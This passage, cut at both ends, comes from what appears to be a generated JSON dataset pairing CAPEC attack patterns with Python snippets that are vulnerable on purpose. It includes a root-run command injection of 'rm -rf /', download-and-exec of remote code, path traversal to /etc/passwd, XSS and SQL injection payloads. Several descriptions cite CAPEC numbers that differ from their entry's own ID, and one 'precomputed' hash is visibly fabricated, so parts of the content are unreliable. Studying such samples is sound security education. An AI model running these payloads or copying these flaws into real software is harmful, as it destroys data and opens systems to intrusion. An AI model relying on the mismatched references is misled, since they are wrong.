        "description": "This Python code snippet demonstrates a scenario where a web service registry is poisoned, leading to potential security vulnerabilities. The code simulates a poisoned registry entry containing a malicious endpoint and WSDL URL. It then parses this entry and attempts to connect to the malicious service. Additionally, the code includes an improper authorization check, where a non-admin user is denied access, and it stores sensitive information (service endpoint and WSDL URL) in cleartext in a simulated registry. This example embodies the main idea of the CAPEC 'Poison Web Service Registry' and highlights related CWEs such as improper authorization, injection, protection mechanism failure, and cleartext storage in the registry."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import os\n\ndef read_file(filename):\n    if '\\0' in filename:\n        raise ValueError(\"Null byte detected in filename\")\n    with open(filename, 'r') as file:\n        return file.read()\n\n# Vulnerable code\nuser_input = input(\"Enter the filename: \")\ncontent = read_file(user_input)\nprint(content)",
        "description": "This Python code snippet demonstrates a potential vulnerability related to the 'Embedding NULL Bytes' CAPEC. The function `read_file` is designed to read the contents of a file given its filename. However, if the filename contains a null byte ('\\0'), it could cause the function to stop processing the input prematurely, leading to unexpected behavior. The code attempts to mitigate this by checking for null bytes in the filename and raising a ValueError if one is found. The vulnerability lies in the fact that if this check is not performed, an attacker could exploit the null byte to manipulate the file path, potentially leading to security issues such as reading unintended files. This example also touches on related CWEs like improper input validation (CWE-20) and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "def is_valid_path(path):\n    # Check if the path ends with a slash\n    if path.endswith('/'):\n        return True\n    return False\n\n# User input\nuser_input = input('Enter the path: ')\n\n# Vulnerable check\nif is_valid_path(user_input):\n    print('Valid path')\nelse:\n    print('Invalid path')\n\n# Example of an attack\nmalicious_input = 'valid_path\\0/invalid_path'\nif is_valid_path(malicious_input):\n    print('Valid path (malicious)')\nelse:\n    print('Invalid path (malicious)')",
        "description": "This Python code snippet demonstrates a vulnerability where a path validation function checks if a given path ends with a slash ('/'). The function `is_valid_path` returns True if the path ends with a slash, otherwise False. The user is prompted to input a path, which is then validated using this function. However, the code is vulnerable to an attack where a null byte ('\\0') is inserted mid-string, followed by a valid path. The null byte can cause the string to be terminated early, bypassing the validation check. This demonstrates the CAPEC concept of using alternate representations of NULL to bypass filters, and it relates to CWEs such as improper neutralization of null bytes (CWE-158), improper handling of alternate encoding (CWE-173), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Database connection\nconn = sqlite3.connect('example.db', check_same_thread=False)\ncursor = conn.cursor()\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    try:\n        # Vulnerable to SQL Injection\n        cursor.execute(f\"SELECT * FROM users WHERE name LIKE '%{query}%'\")\n        results = cursor.fetchall()\n        return jsonify(results)\n    except Exception as e:\n        # Exposing sensitive error information\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask and SQLite. The application has a '/search' endpoint that takes a 'query' parameter from the URL. The code directly incorporates this parameter into an SQL query without proper sanitization, making it susceptible to SQL Injection (CWE-89). Additionally, if an error occurs, the application returns the raw error message, potentially exposing sensitive information (CWE-209). This setup aligns with the CAPEC description, where an adversary probes the application's structure by submitting various queries to extract information beyond the intended scope."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\n# Weak password hashing function\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# Simulated database of user passwords (hashed)\n# CWE-261: Weak Encoding for Password\nuser_db = {\n    'user1': hash_password('password123'),  # CWE-521: Weak Password Requirements\n    'user2': hash_password('123456'),       # CWE-521: Weak Password Requirements\n}\n\n# Function to simulate an attacker using a rainbow table\n# CWE-654: Reliance on a Single Factor in a Security Decision\ndef rainbow_table_attack(hashed_password):\n    rainbow_table = {\n        '5f4dcc3b5aa765d61d8327deb882cf99': 'password',\n        'e10adc3949ba59abbe56e057f20f883e': '123456',\n    }\n    return rainbow_table.get(hashed_password, None)\n\n# Simulate an attack\nfor user, hashed_pw in user_db.items():\n    original_password = rainbow_table_attack(hashed_pw)\n    if original_password:\n        print(f\"User {user}'s password is {original_password}\")\n    else:\n        print(f\"User {user}'s password could not be cracked\")",
        "description": "This Python code snippet demonstrates a vulnerable password storage and authentication system, embodying the main idea of CAPEC-165: Rainbow Table Password Cracking. The code uses weak password hashing (CWE-916) with MD5, which is computationally inexpensive and easily cracked using precomputed hash chains (rainbow tables). The user database contains weak passwords (CWE-521), and the system relies on a single factor for security decisions (CWE-654). The `rainbow_table_attack` function simulates an attacker using a rainbow table to crack the hashed passwords, highlighting the vulnerabilities in the system."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\n# Simulated client-side password hashing\npassword = 'user_password'\nhashed_password = hashlib.sha256(password.encode()).hexdigest()\n\n# Simulated server-side password verification\nstored_hashed_password = '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1e6d7d7d7d7d7d'  # Precomputed hash of 'password'\n\n# Vulnerable authentication check\nif hashed_password == stored_hashed_password:\n    print('Authentication successful')\nelse:\n    print('Authentication failed')\n\n# Vulnerability: Client-side hashing can be bypassed by replaying the hashed password\n# An attacker can capture the hashed password and replay it to bypass authentication",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism where the client-side hashes the password before sending it to the server. The server then compares the received hash with a stored hash. This setup is vulnerable to capture-replay attacks (CWE-294) because an attacker can capture the hashed password and replay it to gain unauthorized access. Additionally, it relies on client-side enforcement of security (CWE-602), which is a flawed approach as the client-side logic can be bypassed or manipulated. The code represents the main idea of the deprecated CAPEC pattern of removing or short-circuiting guard logic, as the security mechanism is easily bypassed by an attacker."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "from flask import Flask, request, jsonify\nimport ssl\n\napp = Flask(__name__)\n\n# Simulate sensitive data\nsensitive_data = {\n    'user1': 'password123',\n    'user2': 'secret456'\n}\n\n@app.route('/get_data', methods=['GET'])\ndef get_data():\n    user = request.args.get('user')\n    if user in sensitive_data:\n        return jsonify({user: sensitive_data[user]})\n    return jsonify({'error': 'User not found'}), 404\n\nif __name__ == '__main__':\n    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')\n    app.run(ssl_context=context)\n",
        "description": "This Python code snippet uses the Flask framework to create a simple RESTful web service that exposes sensitive data. The service has a single endpoint '/get_data' that uses the HTTP GET method to retrieve sensitive information based on a query string parameter. The code simulates sensitive data storage and retrieval without proper authentication or authorization mechanisms, embodying CWE-287 (Improper Authentication) and CWE-598 (Use of GET Request Method With Sensitive Query Strings). Additionally, the SSL context is set up, but the code does not ensure the integrity of the communication channel, representing CWE-300 (Channel Accessible by Non-Endpoint). This example demonstrates how a RESTful application can be vulnerable if it trusts system resources and environment without adequate security measures."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated database\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive Data'},\n    'user': {'role': 'user', 'data': 'User Data'}\n}\n\n# Vulnerable endpoint\n@app.route('/data/<username>', methods=['GET', 'PUT', 'DELETE'])\ndef manage_data(username):\n    if username not in users:\n        return jsonify({'error': 'User not found'}), 404\n\n    if request.method == 'GET':\n        return jsonify({'data': users[username]['data']})\n    elif request.method == 'PUT':\n        new_data = request.json.get('data')\n        users[username]['data'] = new_data\n        return jsonify({'message': 'Data updated'}), 200\n    elif request.method == 'DELETE':\n        del users[username]\n        return jsonify({'message': 'User deleted'}), 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask application with a RESTful API that lacks proper access control mechanisms, embodying the main idea of the CAPEC 'Restful Privilege Elevation'. The endpoint '/data/<username>' allows GET, PUT, and DELETE methods without verifying the user's role or privileges. This can lead to several vulnerabilities described by the related CWEs: \n- CWE-267: Any user can perform unsafe actions like updating or deleting data.\n- CWE-269: The application does not properly manage privileges, allowing any user to modify or delete data.\n- CWE-650: The server trusts HTTP methods without proper access control, allowing state changes via GET requests.\n- CWE-648: The application does not correctly use privileged APIs, leading to potential privilege escalation.\n- CWE-285: The application does not perform proper authorization checks, allowing unauthorized access to resources."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport string\n\n# Function to generate a session ID\ndef generate_session_id():\n    # Using a predictable random seed\n    random.seed(1)\n    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))\n    return session_id\n\n# Simulate user login\nuser_session_id = generate_session_id()\nprint(f'User session ID: {user_session_id}')\n\n# Attacker predicts the session ID\nattacker_session_id = generate_session_id()\nprint(f'Attacker session ID: {attacker_session_id}')\n\n# Check if attacker can hijack the session\nif user_session_id == attacker_session_id:\n    print('Session hijacking successful!')\nelse:\n    print('Session hijacking failed.')",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Session Credential Falsification through Prediction' (CAPEC). The function `generate_session_id` uses a predictable random seed to generate session IDs, which makes it possible for an attacker to predict the session ID. The code simulates a user login and an attacker predicting the session ID. If the predicted session ID matches the user's session ID, the attacker can hijack the session. This example highlights the CWE-330 (Use of Insufficiently Random Values) and CWE-331 (Insufficient Entropy) weaknesses, as the session ID generation lacks sufficient randomness and entropy, making it predictable."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "from flask import Flask, request, session\nimport hashlib\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        sessions[username] = session_id\n        session['session_id'] = session_id\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/protected', methods=['GET'])\ndef protected():\n    session_id = session.get('session_id')\n    if session_id and session_id in sessions.values():\n        return 'Access to protected resource'\n    return 'Access denied'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session replay attacks. The application has a login route that authenticates users and assigns a session ID based on a hash of the username and password. This session ID is stored in a global dictionary and in the user's session. The protected route checks if the session ID in the user's session matches any session ID in the global dictionary to grant access to a protected resource. The vulnerability lies in the reuse of session IDs without proper invalidation, allowing an attacker to reuse a stolen session ID to gain unauthorized access. This example embodies the main idea of CAPEC-139 (Reusing Session IDs) and highlights related CWEs such as CWE-294 (Authentication Bypass by Capture-replay) and CWE-384 (Session Fixation)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        session['user'] = username\n        # Vulnerable: Not regenerating session ID after login\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return 'Please log in first'\n\ndef authenticate(username, password):\n    # Dummy authentication for demonstration\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a login mechanism that is vulnerable to session fixation attacks. The main vulnerability lies in the fact that the session ID is not regenerated after a user successfully logs in. This allows an attacker to set a session ID for the victim before they log in, and then use the same session ID to hijack the authenticated session. The code also touches on related CWEs by showing improper control of session identifiers (CWE-664), incorrect permission assignment (CWE-732), and client-side enforcement of security (CWE-602)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    # Missing CSRF token verification (CWE-352)\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Missing authentication for critical function (CWE-306)\n    # Improper control of a resource through its lifetime (CWE-664)\n    # Incorrect permission assignment for critical resource (CWE-732)\n    # Sensitive cookie with improper SameSite attribute (CWE-1275)\n    response = make_response(f'Transferred {amount} to {recipient}')\n    response.set_cookie('session_id', '12345', samesite='None')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application endpoint using the Flask framework. The '/transfer' route simulates a money transfer function that is susceptible to Cross-Site Request Forgery (CSRF) attacks. The code lacks CSRF token verification (CWE-352), meaning it does not check if the request is intentionally made by the authenticated user. Additionally, it does not perform any authentication for this critical function (CWE-306), allowing unauthorized access. The code also demonstrates improper control over the session cookie's lifetime (CWE-664) and sets the SameSite attribute of the session cookie to 'None' (CWE-1275), making it more vulnerable to CSRF attacks. Furthermore, the code does not correctly assign permissions for the critical resource (CWE-732), potentially allowing unintended actors to perform sensitive actions."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS: directly embedding user input in HTML without proper sanitization\n    html_content = f'<h1>Search Results for: {query}</h1>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks. The application has a single route '/search' that takes a 'query' parameter from the URL. The user input is directly embedded into the HTML content without any sanitization or validation, making it susceptible to XSS attacks. An attacker could inject malicious scripts through the 'query' parameter, which would then be executed in the context of the user's browser. This example embodies the main idea of CAPEC-79 and related CWEs, such as improper neutralization of input (CWE-79), improper input validation (CWE-20), and incomplete denylist to XSS (CWE-692)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\n# Simulated user input\nuser_input = \"..%2F..%2Fetc%2Fpasswd\"\n\n# Improper handling of URL encoding\ndecoded_input = urllib.parse.unquote(user_input)\n\n# Simulated path validation (incorrectly assuming decoded input is safe)\nif \"..\" not in decoded_input:\n    file_path = f\"/var/www/html/{decoded_input}\"\n    print(f\"Accessing file: {file_path}\")\nelse:\n    print(\"Invalid path detected!\")",
        "description": "This Python code snippet demonstrates a vulnerability where URL encoding is improperly handled, leading to potential path traversal attacks. The user input is URL-encoded to represent a path traversal attempt (e.g., accessing '/etc/passwd'). The `urllib.parse.unquote` function decodes the URL-encoded input, but the subsequent validation check only looks for '..' in the decoded input, which is insufficient. This can allow an attacker to bypass the validation logic and access restricted files. The code embodies the main idea of CAPEC-147 by showing how improper handling of URL encoding can lead to security issues, and it relates to several CWEs such as CWE-177 (Improper Handling of URL Encoding), CWE-22 (Path Traversal), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# Downloading code from a remote server without integrity check\nurl = 'http://example.com/update.py'\nresponse = requests.get(url)\n\n# Storing the downloaded code in cleartext\nwith open('update.py', 'w') as file:\n    file.write(response.text)\n\n# Executing the downloaded code\nexec(open('update.py').read())",
        "description": "This Python code snippet demonstrates a scenario where an application downloads code from a remote server without performing any integrity checks (CWE-494). The downloaded code is stored in cleartext (CWE-318) and then executed directly. This embodies the main idea of the CAPEC 'Sniff Application Code', as an adversary could sniff the network communication to capture the code being transmitted in cleartext (CWE-319, CWE-311). The lack of protection mechanisms (CWE-693) makes it easier for an attacker to exploit the trust relationship between the client and server."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\n# Vulnerable function to SQL Injection\n\ndef get_user_info(user_id):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    try:\n        # CWE-89: Improper Neutralization of Special Elements used in an SQL Command\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        cursor.execute(query)\n        result = cursor.fetchall()\n        return result\n    except sqlite3.Error as e:\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        print(f\"Database error: {e}\")\n    finally:\n        # CWE-619: Dangling Database Cursor\n        cursor.close()\n        conn.close()\n\n# Example usage\nuser_input = \"1 OR 1=1\"  # This input can exploit the SQL Injection vulnerability\nprint(get_user_info(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable function `get_user_info` that is susceptible to SQL Injection (CAPEC-66). The function constructs an SQL query using user input without proper validation or neutralization (CWE-89). An attacker can manipulate the `user_id` parameter to alter the SQL query's behavior, potentially accessing unauthorized data. The code also includes an error handling mechanism that prints detailed error messages, which can expose sensitive information (CWE-209). Additionally, the cursor is properly closed in the `finally` block to prevent dangling database cursors (CWE-619). The example usage shows how an attacker can exploit the vulnerability by passing a malicious input."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef log_message(user_input):\n    # Vulnerable code: directly using user input in syslog without format string\n    syslog.syslog(user_input)\n\n# Example usage\nuser_input = input(\"Enter log message: \")\nlog_message(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability related to the misuse of the syslog() function, as described in the CAPEC. The function log_message() takes user input and directly passes it to syslog.syslog() without using a format string. This can lead to a format string injection attack, where an attacker can inject malicious format string commands, potentially causing a buffer overflow. The code embodies CWE-134 (Use of Externally-Controlled Format String) and CWE-20 (Improper Input Validation) by not validating or sanitizing the user input before using it in a security-sensitive context."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (CWE-328)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate a missing cryptographic step (CWE-325)\ndef sign_code(data, private_key):\n    # Missing step: Proper cryptographic signing\n    return weak_hash(data + private_key)\n\n# Simulate subverting code-signing facilities (CAPEC-243)\ndef verify_signature(data, signature, public_key):\n    # Missing step: Proper cryptographic verification\n    expected_signature = weak_hash(data + public_key)\n    return expected_signature == signature\n\n# Example usage\nprivate_key = 'private_key'\npublic_key = 'public_key'\ncode = 'print(\"Hello, World!\")'\nsignature = sign_code(code, private_key)\n\n# Attacker can easily forge the signature due to weak hash and missing cryptographic steps\nforged_signature = weak_hash(code + public_key)\n\nprint(\"Original Signature:\", signature)\nprint(\"Forged Signature:\", forged_signature)\nprint(\"Verification Result:\", verify_signature(code, forged_signature, public_key))",
        "description": "This Python code snippet demonstrates the concept of subverting code-signing facilities (CAPEC-243) by using weak cryptographic practices. The `weak_hash` function uses the MD5 algorithm, which is known to be weak (CWE-328). The `sign_code` function simulates signing code but omits proper cryptographic steps (CWE-325). The `verify_signature` function also lacks proper cryptographic verification. This setup allows an attacker to easily forge a signature, demonstrating how subverting code-signing mechanisms can lead to privilege escalation or execution of untrusted code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\nimport subprocess\n\ndef run_command_with_privileges(command):\n    # CWE-250: Execution with Unnecessary Privileges\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root!\")\n\n    # CWE-15: External Control of System or Configuration Setting\n    # CWE-78: Improper Neutralization of Special Elements used in an OS Command\n    sanitized_command = command.replace(';', '').replace('&', '').replace('|', '')\n    \n    # CWE-114: Process Control\n    subprocess.run(sanitized_command, shell=True)\n\n# CWE-506: Embedded Malicious Code\n# Simulating an attacker injecting a malicious command\nuser_input = \"ls; rm -rf /\"\nrun_command_with_privileges(user_input)",
        "description": "This Python code snippet demonstrates a scenario where a program running with elevated privileges (root) executes a command provided by the user. The function `run_command_with_privileges` checks if the script is run as root (CWE-250) and then attempts to sanitize the user input to prevent OS command injection (CWE-78). However, the sanitization is insufficient, and an attacker can still inject malicious commands (CWE-506). The code uses `subprocess.run` to execute the command, which can lead to executing malicious payloads if the input is not properly sanitized (CWE-114). This snippet embodies the main idea of the CAPEC by showing how a program with elevated privileges can be exploited through improper handling of user input and insufficient privilege management."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\ndefault_username = 'admin'\ndefault_password = 'admin'\n\n# Weak password requirements (CWE-521)\ncommon_passwords = ['password', '123456', 'secret', 'admin']\n\n# Function to simulate login\ndef login(username, password):\n    if username == default_username and password == default_password:\n        return True\n    if password in common_passwords:\n        return True\n    return False\n\n# Simulate user login\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nif login(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable login system that embodies the main idea of the CAPEC 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and weak password requirements (CWE-521). The `login` function checks if the provided username and password match the hard-coded defaults or if the password is one of the common weak passwords. This represents a system that is vulnerable to attacks using common or default credentials. The code highlights the importance of removing default credentials and enforcing strong password policies to prevent unauthorized access."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return False\n    \n    # Canonicalize the input (decode Unicode)\n    canonical_input = user_input.encode('utf-8').decode('unicode_escape')\n    \n    # Check for disallowed patterns after canonicalization\n    if re.search(r'[<>\"\\\n]', canonical_input):\n        return False\n    \n    return True\n\n# Example usage\nuser_input = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\"\nif is_valid_input(user_input):\n    print(\"Input is valid\")\nelse:\n    print(\"Input is invalid\")",
        "description": "This Python code snippet demonstrates a vulnerability where Unicode encoding can be used to bypass validation logic. The function `is_valid_input` first performs early validation on the input string to check if it only contains alphanumeric characters. However, this validation is done before canonicalizing the input, which means that Unicode-encoded characters are not properly interpreted at this stage. After the initial validation, the input is canonicalized by decoding any Unicode escape sequences. A second validation step checks for disallowed patterns such as HTML tags or special characters. This approach is flawed because the initial validation can be bypassed by using Unicode encoding, allowing potentially malicious input to pass through. This code embodies the main idea of CAPEC- using Unicode encoding to bypass validation logic, and it highlights related CWEs such as improper handling of Unicode encoding (CWE-176), incorrect behavior order (CWE-179, CWE-180), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import os\nfrom urllib.parse import unquote\n\ndef handle_request(url):\n    # CWE-20: Improper Input Validation\n    if not url.startswith('http://') and not url.startswith('https://'):\n        raise ValueError('Invalid URL')\n\n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    decoded_url = unquote(url)\n\n    # CWE-73: External Control of File Name or Path\n    file_path = decoded_url.split('/')[-1]\n    if '..' in file_path or file_path.startswith('/'):\n        raise ValueError('Invalid file path')\n\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    safe_file_path = file_path.replace(';', '').replace('&', '')\n\n    # Simulate file access\n    try:\n        with open(safe_file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nurl = 'http://example.com/%2E%2E/%2E%2E/etc/passwd'\nprint(handle_request(url))",
        "description": "This Python code snippet demonstrates a vulnerable handling of URL encoding and file path manipulation. The function `handle_request` takes a URL as input and performs several checks and operations that are prone to vulnerabilities described in the CAPEC and related CWEs. The URL is decoded using `unquote`, which can lead to improper handling of URL encoding (CWE-177). The file path is extracted from the URL and checked for directory traversal patterns (CWE-73). Special characters are not properly neutralized, which can lead to injection attacks (CWE-74). The code attempts to open the file specified in the URL, which can be exploited if the input is not properly validated (CWE-20). This example highlights the importance of proper input validation, encoding handling, and neutralization of special elements to prevent security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    # Vulnerable to User-Controlled Filename attack\n    file.save(os.path.join('/uploads', filename))\n    return 'File uploaded successfully'\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    # Vulnerable to XSS attack\n    return render_template_string('<h1>Viewing file: {{ filename }}</h1>', filename=filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a web application using Flask that is vulnerable to a User-Controlled Filename attack. The application allows users to upload files and view them. The filename is directly taken from the user input without proper validation or sanitization, making it susceptible to malicious input. The 'upload_file' function saves the file with the user-provided filename, and the 'view_file' function renders the filename in an HTML template without proper escaping, leading to potential XSS attacks. This code embodies the main idea of the CAPEC by showing how user-controlled input can lead to security vulnerabilities, such as XSS, when not properly handled."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\nimport os\nimport pickle\n\n# Simulate user state stored in a cookie\nuser_state = {'username': 'user1', 'balance': 100}\ncookie = pickle.dumps(user_state)\n\n# Simulate an attacker modifying the state\nmalicious_state = {'username': 'user1', 'balance': 1000000}\nmalicious_cookie = pickle.dumps(malicious_state)\n\n# Simulate the application loading the state from the cookie\nloaded_state = pickle.loads(malicious_cookie)\n\n# Application logic that uses the tainted state\nif loaded_state['balance'] > 1000:\n    print(\"Access granted to premium features\")\nelse:\n    print(\"Access denied\")",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker manipulates the state information stored in a cookie. The user state, including sensitive information like the balance, is stored in cleartext using Python's pickle module. An attacker can modify this state to elevate privileges, such as gaining access to premium features. This example embodies the CAPEC 'Manipulating State' by showing how an attacker can alter the state to cause the application to behave in an unintended manner. The related CWEs are represented as follows: CWE-315 (Cleartext Storage of Sensitive Information in a Cookie) and CWE-372 (Incomplete Internal State Distinction), as the application does not verify the integrity or authenticity of the state information."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\n\n# Configuration file path\nconfig_file_path = 'config.txt'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to execute a command based on configuration\ndef execute_command(config):\n    # CWE-77: Command Injection vulnerability\n    os.system(config)\n\n# Main function\nif __name__ == '__main__':\n    # CWE-346: Origin Validation Error - No validation of the source of the configuration file\n    config_data = read_config(config_file_path)\n    \n    # CWE-349: Acceptance of untrusted data\n    # CWE-99: Resource Injection - Using untrusted data as a command\n    execute_command(config_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable application that reads a configuration file and executes a command based on its content. The main idea of the CAPEC is represented by the manipulation of a writable configuration file, which can be exploited by an attacker to gain unauthorized access or control over the application. The code includes several related CWEs: CWE-77 (Command Injection) by directly executing the content of the configuration file, CWE-346 (Origin Validation Error) by not validating the source of the configuration file, CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data) by treating the configuration file content as trusted, and CWE-99 (Resource Injection) by using the untrusted data as a command. This snippet highlights the risks associated with improperly handling and validating configuration files."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n@app.route('/download', methods=['GET'])\ndef download_file():\n    filename = request.args.get('file')\n    if not filename:\n        return 'Filename not provided', 400\n    try:\n        # Vulnerable to Path Traversal\n        file_path = os.path.join('/var/www/files', filename)\n        return send_file(file_path)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that allows users to download files from a server. The main idea of the CAPEC is represented by the vulnerability in the `download_file` function, where user input is used to construct a file path without proper validation or neutralization. This can lead to a Path Traversal attack (CWE-22, CWE-23), where an attacker can manipulate the 'file' parameter to access files outside the intended directory. The code also touches on CWE-73 (External Control of File Name or Path) and CWE-285 (Improper Authorization) as it does not properly validate or restrict the file paths that can be accessed."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/set_debug', methods=['GET'])\ndef set_debug():\n    debug_mode = request.args.get('debug')\n    if debug_mode == '1':\n        app.config['DEBUG'] = True\n    else:\n        app.config['DEBUG'] = False\n    return f\"Debug mode set to {app.config['DEBUG']}\"\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a Flask web application where the debug mode can be controlled via a user-supplied query parameter. The endpoint '/set_debug' accepts a 'debug' parameter from the URL query string. If the 'debug' parameter is set to '1', the application's debug mode is enabled; otherwise, it is disabled. This code embodies the main idea of CAPEC-137: 'Manipulating User-Controlled Variables', as it allows an external user to control a critical configuration setting (debug mode) without proper validation or authorization. This can lead to various security issues, such as exposing sensitive information or enabling further attacks. The related CWEs highlight the potential risks, including external control of system settings (CWE-15), improper authorization (CWE-285), and PHP external variable modification (CWE-473), which are analogous to the vulnerabilities demonstrated in this Python example."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
